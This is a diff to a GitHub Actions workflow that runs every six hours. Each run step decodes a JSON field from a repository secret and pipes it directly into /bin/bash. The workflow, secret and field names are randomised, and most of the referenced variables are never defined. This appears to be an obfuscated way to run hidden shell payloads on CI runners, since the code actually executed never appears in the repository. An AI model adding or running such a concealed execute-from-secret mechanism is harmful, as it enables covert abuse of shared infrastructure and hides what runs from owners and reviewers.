@@ -2,24 +2,23 @@ name: temptanaconda
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 0/6 * * *'
+    - cron: '6 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: temptanaconda
         env:
-          iahm1111: ${{ secrets.iahm1111 }}
+          mrfi95: ${{ secrets.mrfi95 }}
         run: |
-          echo $iahm1111 | jq -r .zokbx108 | /bin/bash
-          echo $ngw52413 | jq -r .zs896 | /bin/bash
-          echo $gxwfp875 | jq -r .fgab97 | /bin/bash
-          echo $gm5464 | jq -r .vqx850 | /bin/bash
-          echo $iymzm6 | jq -r .jwd764 | /bin/bash
-          echo $zsef729 | jq -r .hhh312 | /bin/bash
-          echo $a1 | jq -r .ngqxp7178 | /bin/bash
-          echo $mf524 | jq -r .cgx5 | /bin/bash
-          echo $wtylv56 | jq -r .h6 | /bin/bash
+          echo $mrfi95 | jq -r .hzlde250 | /bin/bash
+          echo $rl25629 | jq -r .eaav362 | /bin/bash
+          echo $rfpqv48 | jq -r .fqeyu1919 | /bin/bash
+          echo $r37653 | jq -r .doyf8 | /bin/bash
+          echo $sptmh00157 | jq -r .rxdo8853 | /bin/bash
+          echo $gb46 | jq -r .lzh273 | /bin/bash
+          echo $q7539 | jq -r .rw50 | /bin/bash
+          echo $mtyv32 | jq -r .x416 | /bin/bash
+          echo $rm39236 | jq -r .n997 | /bin/bash
 
